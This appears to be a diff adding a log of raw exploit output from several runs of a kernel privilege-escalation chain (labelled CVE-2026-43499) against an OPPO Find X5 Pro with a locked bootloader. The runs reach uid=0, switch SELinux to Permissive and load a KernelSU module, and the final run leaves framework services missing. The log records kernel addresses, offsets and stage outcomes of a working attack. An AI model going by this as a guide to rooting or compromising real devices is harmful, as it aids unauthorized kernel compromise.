@@ -1,0 +1,445 @@
+# kill.log -- userspace transcripts of the 2026-09-14 / 09-15 root runs
+#
+# DEVICE   OPPO Find X5 Pro (PFEM10), SM8450, ColorOS 16.0.3.520 (CN01)
+# KERNEL   5.10.236-android12-9-o-gaf2075ad2c06
+# BOOT     bootloader locked, green
+# SOURCE   adb shell stdout of the exploit, tee'd to /data/local/tmp/ and
+#          pulled. Reproduced verbatim, not edited.
+#
+# WHAT IS HERE
+#   RUN 1/2  full chain to uid=0 + kernelsu.ko loaded. 2026-09-14.
+#   RUN 3    same chain plus the "crowning test": the KernelSU manager was
+#            launched and polled for 120 s. THIS IS THE MOST INFORMATIVE RUN --
+#            the manager survived and the module stayed loaded, i.e. in this run
+#            nothing killed anything. 2026-09-14.
+#   RUN 4    the 2026-09-15 attempt: same chain, ksud loaded via memfd, and
+#            afterwards the Android framework services were gone
+#            ("Can't find service: package/power/input/phone/wifi") while the
+#            kernelsu module was still Live. Device needed a manual reboot.
+#
+# WHAT IS NOT HERE  (read before drawing conclusions)
+#   * No dmesg / logcat-kernel excerpt for any of these runs.
+#       - `dmesg` is `klogctl: Permission denied` while SELinux is Enforcing.
+#         These runs flip to Permissive via the W1 stage *inside* the run, and
+#         dmesg was never read back afterwards.  A dmesg capture from a
+#         different boot does exist (see notes.md sec.6) and contains no
+#         [ROOTCHECK-*] line at all.
+#       - `logcat -b kernel` was tried (`tools/phase1_capture.sh`) and returns
+#         an empty buffer on this device.
+#     So there is NO `[ROOTCHECK-*]` text and NO
+#     `$$sys_call_number@@ / $$set_id_flag@@ / $$addr_limit@@ / $$enforce@@`
+#     payload anywhere below.  That payload goes to a userspace daemon through
+#     kevent_send_to_user, not to the console.
+#   * Nothing below proves WHY anything stopped.  It proves that uid=0 was
+#     reached, that kernelsu.ko loaded, and -- in RUN 3 -- that the module and
+#     the manager were both still alive 120 s later.
+#
+# HOW TO CLOSE THE GAP  (full recipe in evidence/notes.md sec.6)
+#   1. reach Permissive first (W1 stage of the same run)
+#   2. keep `dmesg -w | grep -E 'ROOTCHECK|oplus_root'` running into
+#      /data/local/tmp/k for the whole run
+#   3. pull /data/local/tmp/k afterwards
+#
+
+==============================================================================
+== RUN 1  full chain, 07:37:42 -> 07:41:27
+== source: out/fire_ksud_0914_073742.log
+==============================================================================
+=== fire_ksud v2 start 2026-09-14 07:37:42 ===
+getenforce=Permissive
+uptime_base=1079.21
+manager pid (want empty): []
+--- LT attempt 1 07:37:44 ---
+LT OK task=0xffffff89325a5c80 child_pid=17984
+--- step WV@0x778 round 1/8 07:38:02 ---
+step WV@0x778 round 1 miss
+--- step WV@0x778 round 2/8 07:38:52 ---
+step WV@0x778 round 2 miss
+--- step WV@0x778 round 3/8 07:39:42 ---
+step WV@0x778 LANDED (ps Uid=root) round 3
+--- step WV@0x780 round 1/8 07:40:26 ---
+step WV@0x780 HIT (round 1)
+--- poke child -> exec .sysdb late-load ---
+=== RESULT ===
+iter=0 uid=0 caps=1 capeff=0x0 pid=17984
+★ uid=0 confirmed — child execs .sysdb
+★ kernelsu LOADED (t+5s):
+kernelsu 217088 2 - Live 0x0000000000000000 (O)
+--- verify ---
+ksud daemon procs: 
+data/adb: ls: /data/adb/: Permission denied
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+[ev] written to /data/local/tmp/ghostlock_w2p_evidence.txt
+LT child_task = 0xffffff89325a5c80 pid=17984
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+LT child exec /data/local/tmp/.sysdb (4 args)
+[ev] written to /data/local/tmp/ghostlock_w2p_evidence.txt
+=== fire_ksud v2 end (KO LOADED, crowning deferred) 2026-09-14 07:41:27 ===
+
+==============================================================================
+== RUN 2  full chain, 07:55:18 -> 08:01:39
+== source: out/fire_ksud_0914_075518.log
+==============================================================================
+=== fire_ksud v2 start 2026-09-14 07:55:18 ===
+getenforce=Permissive
+uptime_base=410.45
+manager pid (want empty): []
+--- LT attempt 1 07:55:20 ---
+LT OK task=0xffffff891c0b8000 child_pid=12523
+--- step WV@0x778 round 1/8 07:55:37 ---
+step WV@0x778 LANDED (ps Uid=root) round 1
+--- step WV@0x780 round 1/8 07:56:25 ---
+step WV@0x780 round 1 miss
+--- step WV@0x780 round 2/8 07:57:17 ---
+step WV@0x780 round 2 miss
+--- step WV@0x780 round 3/8 07:58:02 ---
+step WV@0x780 round 3 miss
+--- step WV@0x780 round 4/8 07:58:59 ---
+step WV@0x780 round 4 miss
+--- step WV@0x780 round 5/8 07:59:49 ---
+step WV@0x780 round 5 miss
+--- step WV@0x780 round 6/8 08:00:41 ---
+step WV@0x780 HIT (round 6)
+--- poke child -> exec .sysdb late-load ---
+=== RESULT ===
+iter=0 uid=0 caps=1 capeff=0x0 pid=12523
+★ uid=0 confirmed — child execs .sysdb
+★ kernelsu LOADED (t+5s):
+kernelsu 217088 2 - Live 0x0000000000000000 (O)
+--- verify ---
+ksud daemon procs: 
+data/adb: ls: /data/adb/: Permission denied
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+[ev] written to /data/local/tmp/ghostlock_w2p_evidence.txt
+LT child_task = 0xffffff891c0b8000 pid=12523
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+LT child exec /data/local/tmp/.sysdb (4 args)
+[ev] written to /data/local/tmp/ghostlock_w2p_evidence.txt
+=== fire_ksud v2 end (KO LOADED, crowning deferred) 2026-09-14 08:01:39 ===
+
+==============================================================================
+== RUN 3  full chain + crowning test (manager polled 120 s), 07:48:17 -> 08:03:51
+== source: out/autopilot_0914_074817.log
+==============================================================================
+=== autopilot: waiting for manual reboot 07:48:17 ===
+t+10s boot_completed= services=
+t+20s boot_completed= services=
+t+30s boot_completed= services=
+t+40s boot_completed= services=
+t+50s boot_completed=1 services=422
+device healthy
+--- W1 round 1 ---
+round 1: Enforcing
+--- W1 round 2 ---
+round 2: Enforcing
+--- W1 round 3 ---
+round 3: Enforcing
+--- W1 round 4 ---
+round 4: Enforcing
+--- W1 round 5 ---
+round 5: Enforcing
+--- W1 round 6 ---
+round 6: Permissive
+=== fire_ksud v2 start 2026-09-14 07:55:18 ===
+getenforce=Permissive
+D:/Desktop/cve202643499/ref/ghostlock-pfem10/exploit_w9: 1 file pushed, 0 skipped. 152.3 MB/s (60640 bytes in 0.000s)
+D:/Desktop/CVE-2025-21479/cve-2025-21479_findx5pro/ksud: 1 file pushed, 0 skipped. 42.3 MB/s (5014624 bytes in 0.113s)
+uptime_base=410.45
+manager pid (want empty): []
+--- LT attempt 1 07:55:20 ---
+LT OK task=0xffffff891c0b8000 child_pid=12523
+--- step WV@0x778 round 1/8 07:55:37 ---
+step WV@0x778 LANDED (ps Uid=root) round 1
+--- step WV@0x780 round 1/8 07:56:25 ---
+step WV@0x780 round 1 miss
+--- step WV@0x780 round 2/8 07:57:17 ---
+step WV@0x780 round 2 miss
+--- step WV@0x780 round 3/8 07:58:02 ---
+step WV@0x780 round 3 miss
+--- step WV@0x780 round 4/8 07:58:59 ---
+step WV@0x780 round 4 miss
+--- step WV@0x780 round 5/8 07:59:49 ---
+step WV@0x780 round 5 miss
+--- step WV@0x780 round 6/8 08:00:41 ---
+step WV@0x780 HIT (round 6)
+--- poke child -> exec .sysdb late-load ---
+=== RESULT ===
+iter=0 uid=0 caps=1 capeff=0x0 pid=12523
+★ uid=0 confirmed — child execs .sysdb
+★ kernelsu LOADED (t+5s):
+kernelsu 217088 2 - Live 0x0000000000000000 (O)
+--- verify ---
+ksud daemon procs: 
+data/adb: ls: /data/adb/: Permission denied
+=== fire_ksud v2 end (KO LOADED, crowning deferred) 2026-09-14 08:01:39 ===
+=== crowning test: am start manager ===
+TotalTime: 0
+WaitTime: 17
+Complete
+mgr_pid=11800
+Uid:	10333	10333	10333	10333
+t+10s up=805.89 mgr=[11800] ksu=1
+t+20s up=816.36 mgr=[11800] ksu=1
+t+30s up=826.85 mgr=[11800] ksu=1
+t+40s up=837.37 mgr=[11800] ksu=1
+t+50s up=848.00 mgr=[11800] ksu=1
+t+60s up=858.43 mgr=[11800] ksu=1
+t+70s up=868.99 mgr=[11800] ksu=1
+t+80s up=879.64 mgr=[11800] ksu=1
+t+90s up=890.19 mgr=[11800] ksu=1
+t+100s up=900.70 mgr=[11800] ksu=1
+t+110s up=911.24 mgr=[11800] ksu=1
+t+120s up=921.70 mgr=[11800] ksu=1
+★ manager SURVIVED 120s — crowning likely safe (check UI)
+=== autopilot end 08:03:51 ===
+
+==============================================================================
+== LT-only probe -- the child that reaches uid=0 (2026-09-14)
+== source: out/archive_0914_root/gw9_lt.log
+==============================================================================
+[33m[*] [0mCVE-2026-43499 trigger_reclaim v12 DIRECT (Path B) probe
+[33m[*] [0mcred_uid=0 (uid=0 root (root_check kills))
+[33m[*] [0mdelta=-3616 kphys=0xa8000000 collisions=16 slabs=32 shift=0
+[33m[*] [0m[drain] waves=5 batch=400
+LT parent pid=19685 child=22258 (poke: kill -USR1 19685)
+[ev] written to /data/local/tmp/ghostlock_w2p_evidence.txt
+[33m[*] [0m[LT] child: perf self-leak...
+[33m[*] [0mperf task: 0xffffff89b77d3780 (50/256 votes)
+LT child_task = 0xffffff89b77d3780 pid=22258
+[ev] written to /data/local/tmp/ghostlock_w2p_evidence.txt
+LT parent pid=19685 child=22258 (poke: kill -USR1 19685)
+LT child reaped=-1 status=0 exited=1 sig=0
+[ev] written to /data/local/tmp/ghostlock_w2p_evidence.txt
+[33m[*] [0m[LT] child woken
+LT child_task = 0xffffff89b77d3780 pid=22258
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+[ev] written to /data/local/tmp/ghostlock_w2p_evidence.txt
+LT child_task = 0xffffff89b77d3780 pid=22258
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+[ev] written to /data/local/tmp/ghostlock_w2p_evidence.txt
+uid=0(root) gid=0(root) egid=0(root) groups=3078438656(root) context=u:r:kernel:s0
+
+==============================================================================
+== RUN 4  LT probe, 2026-09-15
+== source: out/dev_t5_lt.log
+==============================================================================
+[33m[*] [0mCVE-2026-43499 trigger_reclaim v12 DIRECT (Path B) probe
+[33m[*] [0mcred_uid=0 (uid=0 root (root_check kills))
+[33m[*] [0mdelta=-3616 kphys=0xa8000000 collisions=16 slabs=32 shift=0
+[33m[*] [0m[drain] waves=5 batch=400
+LT parent pid=18996 child=21005 (poke: kill -USR1 18996)
+[33m[*] [0m[LT] child: perf self-leak...
+[ev] written to /data/local/tmp/t5_ev.txt
+[33m[*] [0mperf task: 0xffffff8800cdca00 (52/256 votes)
+LT child_task = 0xffffff8800cdca00 pid=21005
+[ev] written to /data/local/tmp/t5_ev.txt
+LT parent pid=18996 child=21005 (poke: kill -USR1 18996)
+LT child reaped=-1 status=0 exited=1 sig=0
+[ev] written to /data/local/tmp/t5_ev.txt
+[33m[*] [0m[LT] child woken
+LT child_task = 0xffffff8800cdca00 pid=21005
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+[ev] written to /data/local/tmp/t5_ev.txt
+LT child_task = 0xffffff8800cdca00 pid=21005
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+[ev] written to /data/local/tmp/t5_ev.txt
+LT child_task = 0xffffff8800cdca00 pid=21005
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+LTC pre-exec enforce=0 (skip pass if 0)
+[ev] written to /data/local/tmp/t5_ev.txt
+LT child_task = 0xffffff8800cdca00 pid=21005
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+LTC pre-exec enforce=0 (skip pass if 0)
+LTC exec phase (unlocked=1)
+[ev] written to /data/local/tmp/t5_ev.txt
+LT child_task = 0xffffff8800cdca00 pid=21005
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+LTC pre-exec enforce=0 (skip pass if 0)
+LTC exec phase (unlocked=1)
+LT child exec /data/local/tmp/glx12 (4 args)
+[ev] written to /data/local/tmp/t5_ev.txt
+LT child_task = 0xffffff8800cdca00 pid=21005
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+LTC pre-exec enforce=0 (skip pass if 0)
+LTC exec phase (unlocked=1)
+LT child exec /data/local/tmp/glx12 (4 args)
+LT child memfd loaded 5014624 bytes (fd=5)
+[ev] written to /data/local/tmp/t5_ev.txt
+
+==============================================================================
+== RUN 4  evidence sink
+== source: out/dev_t5_ev.txt
+==============================================================================
+LT child_task = 0xffffff8800cdca00 pid=21005
+★ LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+LTC pre-exec enforce=0 (skip pass if 0)
+LTC exec phase (unlocked=1)
+LT child exec /data/local/tmp/glx12 (4 args)
+LT child memfd loaded 5014624 bytes (fd=5)
+
+==============================================================================
+== RUN 4  result line
+== source: out/dev_t5_res.txt
+==============================================================================
+iter=0 uid=0 caps=1 capeff=0x0 pid=21005
+
+==============================================================================
+== RUN 4  post-load state: kernelsu Live with a REAL load base
+== source: out/t5_poke.txt
+==============================================================================
+﻿--- poke ---
+poked
+RES_MARK
+iter=0 uid=0 caps=1 capeff=0x0 pid=21005
+EV_MARK
+LT child_task = 0xffffff8800cdca00 pid=21005
+鈽?LT child ROOT: uid=0 caps=FULL CapEff=0x0
+LT child exec /system/bin/id...
+LTC pre-exec enforce=0 (skip pass if 0)
+LTC exec phase (unlocked=1)
+LT child exec /data/local/tmp/glx12 (4 args)
+LT child memfd loaded 5014624 bytes (fd=5)
+KO_MARK
+kernelsu 217088 0 - Live 0xffffffe21e6f2000 (O)
+enf=1 up=5786
+
+==============================================================================
+== RUN 4  keepalive 60 s -- module still loaded, framework services gone
+== source: out/t5_keepalive.txt
+==============================================================================
+﻿--- keepalive 60s ---
+t+ 20 s up=5831 ko=1 enf=1 kptr=0
+t+ 40 s up=5851 ko=1 enf=1 kptr=0
+t+ 60 s up=5871 ko=1 enf=1 kptr=0
+--- ksu procs / manager ---
+adb.exe : /system/bin/sh: resukisu: inaccessible or not found
+所在位置 行:463 字符: 1
++ & $adb shell 'pm list packages | grep -i -E "sukisu|kernelsu|resukisu ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (/system/bin/sh:...le or not found 
+   :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+/system/bin/sh: kernelsu: inaccessible or not found
+cmd: Can't find service: package
+--- archive evidence ---
+adb.exe : /data/local/tmp/t5_ev.txt: 1 file pulled, 0 skipped. 0.1 MB/s (279 by
+tes in 0.003s)
+所在位置 行:466 字符: 3
++   & $adb pull "/data/local/tmp/$f" "D:\Desktop\cve202643499\out\dev_$ ...
++   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (/data/local/tmp...ytes in 0.003s) 
+   :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+adb.exe : /data/local/tmp/t5_res.txt: 1 file pulled, 0 skipped. 0.0 MB/s (41 by
+tes in 0.006s)
+所在位置 行:466 字符: 3
++   & $adb pull "/data/local/tmp/$f" "D:\Desktop\cve202643499\out\dev_$ ...
++   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (/data/local/tmp...ytes in 0.006s) 
+   :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+adb.exe : /data/local/tmp/t5_lt.log: 1 file pulled, 0 skipped. 0.4 MB/s (2032 b
+ytes in 0.005s)
+所在位置 行:466 字符: 3
++   & $adb pull "/data/local/tmp/$f" "D:\Desktop\cve202643499\out\dev_$ ...
++   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (/data/local/tmp...ytes in 0.005s) 
+   :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+adb.exe : /data/local/tmp/t5_w7.log: 1 file pulled, 0 skipped. 6.7 MB/s (49359 
+bytes in 0.007s)
+所在位置 行:466 字符: 3
++   & $adb pull "/data/local/tmp/$f" "D:\Desktop\cve202643499\out\dev_$ ...
++   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (/data/local/tmp...ytes in 0.007s) 
+   :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+adb.exe : /data/local/tmp/t5_w7b.log: 1 file pulled, 0 skipped. 5.7 MB/s (24198
+ bytes in 0.004s)
+所在位置 行:466 字符: 3
++   & $adb pull "/data/local/tmp/$f" "D:\Desktop\cve202643499\out\dev_$ ...
++   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (/data/local/tmp...ytes in 0.004s) 
+   :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+adb.exe : /data/local/tmp/t5_rep.log: 1 file pulled, 0 skipped. 4.8 MB/s (23019
+ bytes in 0.005s)
+所在位置 行:466 字符: 3
++   & $adb pull "/data/local/tmp/$f" "D:\Desktop\cve202643499\out\dev_$ ...
++   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (/data/local/tmp...ytes in 0.005s) 
+   :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+21542 /data/local/tmp/t5_dmesg.txt
+adb.exe : /data/local/tmp/t5_dmesg.txt: 1 file pulled, 0 skipped. 34.0 MB/s (20
+51932 bytes in 0.058s)
+所在位置 行:469 字符: 1
++ & $adb pull /data/local/tmp/t5_dmesg.txt "D:\Desktop\cve202643499\out ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (/data/local/tmp...ytes in 0.058s) 
+   :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+ok
+
+==============================================================================
+== RUN 4  framework services missing
+== source: out/wake_check.txt
+==============================================================================
+﻿List of devices attached
+91f71075	device
+
+up=5886 boot=1
+kernelsu 217088 0 - Live 0xffffffe21e6f2000 (O)
+adb.exe : Can't find service: power
+所在位置 行:457 字符: 1
++ & $adb shell 'dumpsys power | grep -m4 -i wakefulness' 2>&1 | Out-Fil ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (Can't find service: power:String) 
+    [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+--- wake screen + restore svc ---
+adb.exe : cmd: Can't find service: input
+所在位置 行:459 字符: 1
++ & $adb shell 'input keyevent 224; svc data enable; svc wifi enable; e ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (cmd: Can't find service: input:St 
+   ring) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+cmd: Can't find service: phone
+cmd: Can't find service: wifi
+woke
+adb.exe : Can't find service: power
+所在位置 行:461 字符: 1
++ & $adb shell 'dumpsys power | grep -m4 -i wakefulness' 2>&1 | Out-Fil ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (Can't find service: power:String) 
+    [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+
+==============================================================================
+== result line, 2026-09-14
+== source: out/archive_0914_root/w2p_result.txt
+==============================================================================
+iter=0 uid=0 caps=1 capeff=0x0 pid=22258
